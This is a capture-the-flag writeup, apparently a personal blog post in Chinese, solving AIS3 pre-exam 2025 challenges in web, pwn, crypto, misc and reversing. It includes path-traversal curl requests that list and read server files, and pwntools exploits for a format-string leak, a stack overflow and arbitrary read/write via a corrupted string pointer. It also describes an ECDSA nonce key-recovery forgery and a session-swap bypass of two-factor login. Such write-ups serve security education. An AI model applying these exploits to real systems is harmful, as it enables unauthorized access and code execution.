---
title: "AIS3 pre-exam 2025 Writeup"
description: "picoCTF 2025 Writeup"
publishDate: "1 Jul 2025"
updatedDate: "25 Aug 2025"
tags: ["CTF", "writeup", "AIS3"]
---

> Author: Grissia 林暉恩  
> Final Score: 1781  
> Final Rank: 17/389  

# web

## Tomorin db 🐧

> flag: `AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}`

進去之後就可以看到~~可愛的~~ Flag 在那邊躺著  
但是點進去怎麼是千早愛音，~~所以我決定先把題目丟在一邊然後看一下 MyGO~~  
最直觀的想法就是先 curl 看看  

```bash
❯ curl http://chals1.ais3.org:30000/flag
<a href="https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4l6">Found</a>.
```

看起來就只是一個重新導向的東西，所以想說可能可以用 `../flag` 之類的  
~~不過我倒是沒想到一次就成功了...~~

```bash
❯ curl http://chals1.ais3.org:30000/%2e%2e/flag
AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}
```

## Login Screen 1

進去之後看到一個登入介面，並且可以用 `guest/guest` 登入  
通靈一下就可以找到另一組帳密 `admin/admin`  
不過因為不知道 2FA，有 admin 也不能怎樣  
但是我發現在輸入 2FA 的時候會發送兩個封包  
第一個會傳送 2FA，另一個會把我們導向到登入後的介面  
所以我的作法是先用 admin 登入，取得 admin 的 PHP Session  
接著用 guest 登入，並在輸入 2FA 時攔截封包  
在放行第一個封包後，把第二個封包的 PHP Session 改成剛剛取得的 admin Session  
這樣就可以成功看到 flag 了  

# pwn

## Format Number

> flag: `AIS3{S1d3_ch@nn3l_0n_fOrM47_stln&_!!!}`

這題給了一個 `%3_d` 底線部分可以改成數字或符號  
不過這就表示任意的 format string 像是 `%19$p` 沒辦法被輕易執行  
我當下想說：既然 format string 是讀取 `$` 符號後面的字符  
那我是不是也可以用 `'1'` 這種數字的字元來觸發他  
所以我打算把 payload 改成 `%3$'1' %19$d` 這樣也許可以無效化原本的 payload  
經過測試，發現這個做法是可行的，接著在平台上戳戳看，發現 20 就是 AIS3 的 A  
所以簡單的寫一個 exploit  

```python
from pwn import *

flag = ""

for i in range(20, 100):
    r = remote("chals1.ais3.org", 50960)
    payload = f"$'1'%{i}$".encode()
    r.sendlineafter(b"What format do you want ? ", payload)
    a = r.recvline().strip().decode().split()[-1].split("'1'")[-1]
    # log.success(f"revieved: {a}")
    if a == "0":
        break
    flag += chr(int(a))
    r.close()

log.success(flag)
```

運行過程：

```bash
❯ python3 exp.py
[+] Opening connection to chals1.ais3.org on port 50960: Done
[*] Closed connection to chals1.ais3.org port 50960
[+] Opening connection to chals1.ais3.org on port 50960: Done
[*] Closed connection to chals1.ais3.org port 50960
...
[+] Opening connection to chals1.ais3.org on port 50960: Done
[+] AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}
[*] Closed connection to chals1.ais3.org port 50960
```

## Welcome to the World of Ave Mujica🌙

> flag: `AIS3{MyGO!!!!!T0m0rin_1s_cut3@u_a2r_mAsr3r_0f_CP1usp1us_string_a2d_0verf10w!_alpha_v3r2on_have_br0ken...Go_p1ay_b3ta!}`

用 gdb 直接起來測試就可以看到一個帥氣的 banner  
經過 ida 反組譯後就可以發現前面要輸入 `yes` 和一個輸入長度  
但是這邊有一個漏洞：可以利用 -1 來繞過最大數字檢查，同時輸入大量字元  
除此之外，還可以看到一個可疑的函式 `Welcome_to_the_world_of_Ave_Mujica` 裡面有個後門  
checksec 檢查後可以看到這題沒開 PIE 跟 canary，所以就直接 cyclic 算 offset 然後跳到 win 執行  

exploit:
```python
from pwn import *

FILENAME = "./chal"
context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

r = process(FILENAME)

win = exe.symbols['Welcome_to_the_world_of_Ave_Mujica']

offset = 168
r.sendlineafter(b'?', b'yes')
r.sendlineafter(b':', b'-1')
r.sendlineafter(b':', b'A' * offset + p64(win))

r.interactive()
```

## MyGO schedule manager α

這題的出自 `std::cin >> sched->title;`  
使得用戶可以利用 `schedule` 的結構來寫入 `string content` 的位置  
經過查閱，我發現 string 的結構大致長這樣

```cpp
struct std::string {
    char *ptr;        // pointer to data
    size_t len;       // string length
    size_t cap;       // capacity
};
```

所以利用上面的 overflow，我們可以改掉 String 的 ptr，配合其他功能來達到任意讀寫
遇到的第一個問題在於執行時輸出的格式不一，~~但我又懶的改很多 code~~  
在經過一連串 debug 後，我藉由讀寫時的不同狀態寫出了兩種任意讀取、一種任意寫入的方法  
整體讀取/寫入的流程大致如下:

1. edit title & overwrite string ptr
2. use the builtin read/write function to access the memory

不過這題的保護開蠻多的，所以整個攻擊流程有點長:

1. 讀 puts@got 取得 libc base
2. 讀 environ 來取得一固定 Stack 位址
3. Leak 出 Stack 後就寫 saved return address 成 backdoor
4. 觸發 break 離開 main

完整 exploit 如下:
> P.S. 不是我不想用 pwntools 的 .symbols 問題是這題開 strip 阿
```python
from pwn import *
import sys
import time
# FILENAME = "./chal"
FILENAME = "./chal_patched"
context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")


def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]


if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r, 'b *0x40147f')
        pause()
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.sendlineafter(b"Username > ", b"MyGO!!!!!")
r.sendlineafter(b"Password > ", b"TomorinIsCute")


r.sendlineafter(b"$ > ", b"1")
r.sendlineafter(b"MyGO @ sched title > ", b"Grissia")
r.sendlineafter(b"MyGO @ sched content > ", b"is_a_good_hacker")

"""
0000000000222200 B __environ@@GLIBC_2.2.5
0000000000222200 V _environ@@GLIBC_2.2.5
0000000000222200 V environ@@GLIBC_2.2.5

0000000000403fd0 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5

0x000000000040101a : ret
"""


def read1(addr):
    offset = 0x18
    payload = b'A'*offset + p64(addr) + p64(8) + p64(8)
    r.sendlineafter(b"$ > ", b"2")
    r.sendlineafter(b"MyGO @ sched title > ", payload)
    r.sendlineafter(b"$ > ", b"4")
    r.recvline()
    return u64(r.recvuntil("\x7f")[-6:].ljust(8, b'\x00'))


def read2(addr):
    offset = 0x18
    payload = b'A'*offset + p64(addr) + p64(8) + p64(8)
    r.sendlineafter(b"$ > ", b"2")
    r.sendlineafter(b"MyGO @ sched title > ", payload)
    r.sendlineafter(b"$ > ", b"4")
    r.recvline()
    r.recvline()
    return u64(r.recvline().strip().split()[-1].ljust(8, b'\x00'))


def write1(addr, data):
    try:
        offset = 0x18
        payload = b'A'*offset + p64(addr) + p64(8) + p64(8)
        r.sendlineafter(b"$ > ", b"2")
        r.sendlineafter(b"MyGO @ sched title > ", payload)

        r.sendlineafter(b"$ > ", b"3")
        payload = p64(data)
        r.sendlineafter(b"MyGO @ sched content >", payload)
    except EOFError:
        pass


puts_got = exe.got['puts']
puts_real = read1(puts_got)
log.success(f"puts_real = {hex(puts_real)}")

libc.address = puts_real - libc.symbols['puts']
log.success(f"libc.address = {hex(libc.address)}")

environ_addr = libc.symbols['environ']
log.success(f'environ addr: {hex(environ_addr)}')

stack_leak = read2(environ_addr)
log.success(f'Stack leak: {hex(stack_leak)}')

offset = 0x120
write1(stack_leak - offset, 0x40101a)
write1(stack_leak - offset + 0x8, 0x4013ec)

r.sendlineafter(b"$ > ", b"5")
r.interactive()
```


# misc

## Ramen CTF

這題最明顯的問題出在旁邊露出一半的發票  
經過[這份財政部文件](https://www.einvoice.nat.gov.tw/static/ptl/ein_upload/attachments/1479449792874_0.6(20161115).pdf)，可以把掃到的結果分類拆解成這樣  

```
MF16879911
1140413
7095
000001f4
000001f4
00000000
34785923
VG9sG89nFznfPnKYFRlsoA==
:**********
:2
:2
:1
:蝦拉
```

接著就可以到 [發票查詢](https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search) 找到這張發票的資訊了

## Welcome

> flag: `AIS3{Welcome_And_Enjoy_The_CTF_!}`

~~可惡阿 `dkri3c1` 打字比我快 4 秒，不然我就首殺 Welcome 了~~  
沒什麼技巧，純靠打字 (AIS3 專題可以研究怎麼讓參賽者不能複製嗎...)

## AIS3 Tiny Server - Web / Misc

> flag: `AIS3{tInY_We8_s3RV3R_W17H_FIL3_BR0Ws1n9_@5_@_Fe@tuRe}`

我是先非預期解 Tomorin DB 才看這題的  
結果用同一個方法也能解  
我首先試了:

```bash
❯ curl http://chals1.ais3.org:20457/%2e%2e/
<html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
<tr><td><a href="html/">html/</a></td><td>2025-05-24 05:49</td><td>[DIR]</td></tr>
</table></body></html>%                                                                                                 
```

結果這個結果可以說是意想不到，代表八成有受到這個漏洞的影響  
在多加了幾個 `../../` 之後成功看到 flag 的位置:

```bash
❯ curl http://chals1.ais3.org:20457/%2e%2e/%2e%2e/%2e%2e/
<html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
<tr><td><a href="lib32/">lib32/</a></td><td>2025-05-21 15:12</td><td>[DIR]</td></tr>
<tr><td><a href="tmp/">tmp/</a></td><td>2025-05-21 15:12</td><td>[DIR]</td></tr>
<tr><td><a href="libx32/">libx32/</a></td><td>2025-05-21 15:12</td><td>[DIR]</td></tr>
...
<tr><td><a href="boot/">boot/</a></td><td>2022-04-18 10:28</td><td>[DIR]</td></tr>
<tr><td><a href="readable_flag_YdVUQHstgu7KYLIJjfVN9Fz9LccwF5Fp">readable_flag_YdVUQHstgu7KYLIJjfVN9Fz9LccwF5Fp</a></td><td>2025-06-02 11:42</td><td>54</td></tr>
<tr><td><a href=".dockerenv">.dockerenv</a></td><td>2025-06-02 11:42</td><td>0</td></tr>
<tr><td><a href="readflag">readflag</a></td><td>2025-05-22 16:22</td><td>884.1K</td></tr>
</table></body></html>%                                                                                                 
```

這樣就可以直接去讀 flag 了

```bash
❯ curl http://chals1.ais3.org:20457/%2e%2e/%2e%2e/%2e%2e/readable_flag_YdVUQHstgu7KYLIJjfVN9Fz9LccwF5Fp
AIS3{tInY_We8_s3RV3R_W17H_FIL3_BR0Ws1n9_@5_@_Fe@tuRe}
```

# crypto

## SlowECDSA

> flag: `AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}`

因為 server 端的簽章存在 LCG nonce 弱點，可以寫出  

$$
\begin{aligned}
s_1 \cdot k_1 &= h_1 + r_1 \cdot d \quad (1) \\
s_2 \cdot k_2 &= h_2 + r_2 \cdot d \quad (2) \\ 
k_2 &= A \cdot k_1 + C
\end{aligned}
$$

所以我們整理之後就可以寫成

$$
\begin{aligned}
\left( s_2 A - \frac{r_2 s_1}{r_1} \right) k_1 &= h_2 - s_2 C - \frac{r_2 h_1}{r_1} \\
k_1 &= \frac{h_2 - s_2 C - \frac{r_2 h_1}{r_1}}{s_2 A - \frac{r_2 s_1}{r_1}} \bmod n
\end{aligned}
$$

$$
\begin{aligned}
d &= \frac{s_1 k_1 - h_1}{r_1} \bmod n
\end{aligned}
$$

這樣就可以透過已知的資訊求出 k1，最後算出 d  

exploit:

```python
#!/usr/bin/env python3
import hashlib
import socket
import re
from ecdsa import NIST192p

HOST = "chals1.ais3.org"
PORT = 19000

curve = NIST192p
order = curve.generator.order()
A, C, M = 1103515245, 12345, order


def recv_until(sock, end=b":"):
    data = b""
    while not data.strip().endswith(end):
        data += sock.recv(4096)
    return data.decode()


def send_cmd(sock, cmd):
    sock.send(cmd.encode() + b"\n")
    return recv_until(sock)


def get_sig(sock):
    out = send_cmd(sock, "get_example")
    m = re.search(r'msg: (\w+).*r: (0x[0-9a-f]+).*s: (0x[0-9a-f]+)', out, re.S)
    return m.group(1), int(m.group(2), 16), int(m.group(3), 16)


def sha1(m): return int.from_bytes(
    hashlib.sha1(m.encode()).digest(), 'big') % order


def inv(x): return pow(x, -1, order)


def recover_key(m1, r1, s1, m2, r2, s2):
    h1, h2, r1i = sha1(m1), sha1(m2), inv(r1)
    num = (h2 - s2*C - r2*r1i*h1) % order
    den = (s2*A - r2*r1i*s1) % order
    k1 = (num * inv(den)) % order
    d = ((s1*k1 - h1) * r1i) % order
    return d, k1


def forge(msg, d, k):
    r = (k * curve.generator).x() % order
    s = (inv(k) * (sha1(msg) + r*d)) % order
    return r, s


def main():
    s = socket.create_connection((HOST, PORT))
    recv_until(s)

    m1, r1, s1 = get_sig(s)
    m2, r2, s2 = get_sig(s)
    d, k1 = recover_key(m1, r1, s1, m2, r2, s2)
    k3 = (A * (A * k1 + C) + C) % order

    r, sig = forge("give_me_flag", d, k3)
    send_cmd(s, "verify")
    send_cmd(s, "give_me_flag")
    send_cmd(s, hex(r))
    print(send_cmd(s, hex(sig)))


if __name__ == "__main__":
    main()
```


## Stream

> flag: `AIS3{no_more_junks...plz}`

這題的考點在於 getrandbits 的隨機化程度不夠，可以預測  
所以就只要用 randcrack 就可以解開了找到 Key  
接著就只要 xor 還原他就好了  

```python
from hashlib import sha512
import math
import randcrack

file = open("output.txt", "r")

output = []
hashes = []

for i in range(256):
    hashes.append(int.from_bytes(sha512(bytes([i])).digest()))

for i in range(80):
    line = file.readline()
    output.append(int(line.strip(), 16))
    
roots = []
for i in output:
    ans = 0
    for j in hashes:
        x = i ^ j
        sqrt_x = math.isqrt(x)
        if sqrt_x * sqrt_x == x:
            roots.append(sqrt_x)

rc = randcrack.RandCrack()

l = 0
for i in roots:
    num = hex(i)[2:]
    num = num.ljust(64, '0')
    for j in range(8):
        rc.submit(int(num[8*(7-j):8*(8-j)], 16))
        l+=1
        if(l == 624):
            break
    if(l == 624):
        break

print(rc.predict_getrandbits(256) == roots[78])
print(rc.predict_getrandbits(256) == roots[79])
key = rc.predict_getrandbits(256)

flag_enc = int(file.readline().strip(), 16)
key = key ** 2
ans = hex(flag_enc ^ key)[2:]

flag_bytes = bytes.fromhex(ans)
print(flag_bytes.decode(), end='')
```

## Random_RSA

> flag: `AIS3{1_d0n7_r34lly_why_1_d1dn7_u53_637pr1m3}`

根據 LCG 生成的性質，可以寫出

$$
\mathbb{h}_1 \equiv \mathbb{h}_0 + b \pmod M \\
\mathbb{h}_2 \equiv \mathbb{h}_1 + b \pmod M
$$

兩式相減後就會變成

$$
\mathbb{h}_2 - \mathbb{h}_1 \equiv a(\mathbb{h}_1 - \mathbb{h}_0) \pmod M
$$

所以我們可以藉由這個式子，移項一下求出 a, b  
那第 t 項就可以寫成

$$
a^{t}x + \frac {b(a^{t} - 1)} {a-1} \pmod M
$$

接著就快樂爆破找 t，就可以算出 p, q 然後快樂 RSA  

```python
from sympy import invert, sqrt_mod, isprime
from Crypto.Util.number import long_to_bytes

h = [
    2907912348071002191916245879840138889735709943414364520299382570212475664973498303148546601830195365671249713744375530648664437471280487562574592742821690,
    5219570204284812488215277869168835724665994479829252933074016962454040118179380992102083718110805995679305993644383407142033253210536471262305016949439530,
    3292606373174558349287781108411342893927327001084431632082705949610494115057392108919491335943021485430670111202762563173412601653218383334610469707428133,
]
M = 9231171733756340601102386102178805385032208002575584733589531876659696378543482750405667840001558314787877405189256038508646253285323713104862940427630413
n = 20599328129696557262047878791381948558434171582567106509135896622660091263897671968886564055848784308773908202882811211530677559955287850926392376242847620181251966209002883852930899738618123390979377039185898110068266682754465191146100237798667746852667232289994907159051427785452874737675171674258299307283
e = 65537
c = 13859390954352613778444691258524799427895807939215664222534371322785849647150841939259007179911957028718342213945366615973766496138577038137962897225994312647648726884239479937355956566905812379283663291111623700888920153030620598532015934309793660829874240157367798084893920288420608811714295381459127830201

a = ((h[2] - h[1]) * invert(h[1] - h[0], M)) % M
b = (h[1] - a * h[0]) % M
inv_am1 = invert((a - 1) % M, M)

for t in range(1, 2001):
    A = pow(a, t, M)
    B = b * (A - 1) * inv_am1 % M
    Δ = (B * B + 4 * A * n) % M
    try:
        roots = sqrt_mod(Δ, M, True)
    except ValueError:
        continue
    for r in roots:
        inv_d = invert(2 * A, M)
        if inv_d is None:
            continue
        p = ((-B + r) * inv_d) % M
        if p and n % p == 0:
            q = n // p
            if isprime(p) and isprime(q):
                phi = (p - 1) * (q - 1)
                d = int(invert(e, phi))
                m = pow(c, d, n)
                print("FLAG:", long_to_bytes(m))
                exit()
raise RuntimeError()
```

# rev

## AIS3 Tiny Server - Reverse

這題在把執行檔丟進 ida 分析後 `Shift+F12` 可以看到一些可疑的字串  

```
.rodata:0000311C	0000000B	C	AIS3-Flag:
.rodata:00003127	0000000E	C	Flag Correct!
.rodata:00003135	0000000B	C	Wrong Flag
```

接著按 `x` 可以看到他只有被其中一個函式引用，以下附錄 ida decompile 後的程式:

```c
_BOOL4 __cdecl sub_1E20(int a1)
{
  unsigned int idx; // ecx
  char key1; // si
  char key2; // al
  int i; // eax
  char v5; // dl
  _BYTE v7[10]; // [esp+7h] [ebp-49h] BYREF
  _DWORD v8[11]; // [esp+12h] [ebp-3Eh]
  __int16 v9; // [esp+3Eh] [ebp-12h]

  idx = 0;
  key1 = 51;
  v9 = 20;
  key2 = 114;
  v8[0] = 1480073267;
  v8[1] = 1197221906;
  v8[2] = 254628393;
  v8[3] = 920154;
  v8[4] = 1343445007;
  v8[5] = 874076697;
  v8[6] = 1127428440;
  v8[7] = 1510228243;
  v8[8] = 743978009;
  v8[9] = 54940467;
  v8[10] = 1246382110;
  qmemcpy(v7, "rikki_l0v3", sizeof(v7));
  while ( 1 )
  {
    *((_BYTE *)v8 + idx++) = key1 ^ key2;
    if ( idx == 45 )
      break;
    key1 = *((_BYTE *)v8 + idx);
    key2 = v7[idx % 0xA];
  }
  for ( i = 0; i != 45; ++i )
  {
    v5 = *(_BYTE *)(a1 + i);
    if ( !v5 || v5 != *((_BYTE *)v8 + i) )
      return 0;
  }
  return *(_BYTE *)(a1 + 45) == 0;
}
```

整個解密的邏輯很簡單，就只是 xor 而已  
不過因為我用 python 寫總覺得怪怪的，所以我就跟著用 c 了  

```c
#include <stdio.h>
#include <string.h>

void decode_password() {
    unsigned int idx = 0;
    char key1 = 51;
    char key2 = 114;
    
    unsigned int data[] = {
        1480073267, 1197221906, 254628393, 920154, 1343445007,
        874076697, 1127428440, 1510228243, 743978009, 54940467, 1246382110
    };
    
    char xor_key[] = "rikki_l0v3";
    char password[46] = {0};
    
    while (idx < 45) {
        password[idx] = key1 ^ key2;
        idx++;
        if (idx < 45) {
            key1 = ((char*)data)[idx];
            key2 = xor_key[idx % 10];
        }
    }
    
    printf("Decoded password: %s\n", password);
    printf("Password length: %lu\n", strlen(password));
}

int main() {
    decode_password();
    return 0;
}
```


### web flag checker

> flag: `AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`

進去之後很明顯可以看到裡面有個 `index.wasm`  
查了一下後會發現這是一種在網頁上寫 assembly 的東西 ~~酷喔...~~  
翻了一下，在 [Github](https://github.com/wasmkit/diswasm) 找到這個東西，可以 decompile  
按照說明執行下去就可以解析出一個 c 語言的檔案 (先姑且叫他 index.c)  
裡面有個標註為 flag_checker 的函式，經過整理，可以寫成這樣

```c
export "flagchecker"; // $func9 is exported to "flagchecker"
int $func2(int param0) {
  // offset=0x58
  int local_58;
  // offset=0x54
  int local_54;
  // offset=0x40
  long local_40;
  // offset=0x38
  long local_38;
  // offset=0x30
  long local_30;
  // offset=0x28
  long local_28;
  // offset=0x20
  long output_piece;
  // offset=0x5c
  int local_5c;
  // offset=0x1c
  int input;
  // offset=0x18
  int i;
  // offset=0x10
  long input_piece;
  // offset=0xc
  int ror_num;

  local_58 = param0;
  local_54 = -0x26158d3;
  local_40 = 0x0;
  local_38 = 0x0;
  local_30 = 0x0;
  local_28 = 0x0;
  output_piece = 0x0;
  output_piece = 0x7577352992956835434;
  local_28 = 0x7148661717033493303;
  local_30 = -0x7081446828746089091;
  local_38 = -0x7479441386887439825;
  local_40 = 0x8046961146294847270;
  label$1: {
    label$2: {
      label$3: {
        if ((((local_58 != 0x0) & 0x1) == 0x0)) break label$3;
        if (((($strlen(local_58) != 0x28) & 0x1) == 0x0)) break label$2;
      };
      local_5c = 0x0;
      break label$1;
    };
    input = local_58;
    i = 0x0;
    label$4: {
      while (1) {
        if ((((i < 0x5) & 0x1) == 0x0)) break label$4;
        input_piece = *((unsigned long *) (input + (i << 0x3)));
        ror_num = ((-0x26158d3 >>> (i * 0x6)) & 0x3f);
        label$6: {
          if (((($func1(input_piece, ror_num) != *((unsigned long *) (&output_piece + (i << 0x3)))) & 0x1) == 0x0)) break label$6;
          local_5c = 0x0;
          break label$1;
        };
        i++;
        break label$5;
      break ;
      };
    };
    local_5c = 0x1;
  };
  return local_5c;
}
```

裡面主要的加密手段是呼叫 `func1`  
可以看出他就是個 rotate 用的東西  
所以就只要依照他的邏輯逆回去就好了  

```python
def rotate(x, n):
    return ((x >> n) | (x << (64 - n))) & 0xFFFFFFFFFFFFFFFF

output = [
  7577352992956835434,      # 真不知道做這個工具的人在想什麼，明明是十進位還加 0x 在前面
  7148661717033493303,
  0x9db9a5a0dcc5dd7d,       # 這兩個負數要轉成 unsigned
  0x9833afafb8381a2f,
  8046961146294847270,
]

ror_num = [45,28,42,39,61]
flag = b""

for i, j in zip(output, ror_num):
    flag += (rotate(i, j)).to_bytes(8, 'little')

print(flag)
```

## A_simple_snake_game

> flag: `AIS3{CH3aT_Eng1n3?_Ofcau53_I_bo_1T_by_hAnD}`

這題我當下本來是想用 CheatEngine 解的，但我跟 x64dbg 不熟，不會把遊戲停下來...，所以我後來選擇 patch exe 了  

具體步驟如下:

1. 用 ghidra decompile 他
2. 到 main 沒找到什麼特別的，跳轉到 WinMain
3. 到 WinMain 沒找到什麼特別的，跳轉到 main_getcmdline
4. 到 main_getcmdline 沒找到什麼特別的，跳轉到 _SDL_main
5. 裡面看到可疑的變數，依據程式碼，合理推斷它是生命值

    ```c
    if (lifes == 0) {
        local_d0.call_site = 2;
        SnakeGame::Screen::clear(local_5c);
        SnakeGame::Screen::drawGameOver(local_5c);
        SnakeGame::Screen::update(local_5c,local_20,lifes,'\x01');
        holdGame(local_5c,3000);
    }
    ```
6. 順著它查下去，找到 `SnakeGame::Screen::update` 函式
7. 裡面呼叫了 `drawText(param_1,lifes);` 函式
8. drawText 裡面有奇怪的判斷條件，八成就是勝利條件，直接把它 patch 成負數

    ```c
    if ((score < -99) || (lifes < -99)) {
        local_f4.call_site = -1;
        createText[abi:cxx11]();
        local_48 = 0xffffff;
        std::__cxx11::string::c_str(local_44);
        local_f4.call_site = 3;
        uVar8 = _TTF_RenderText_Solid();
        *(undefined4 *)(local_c0 + 0xc) = uVar8;
        ...
    }
    ```

9. 儲存後運行程式，即可看到 Flag

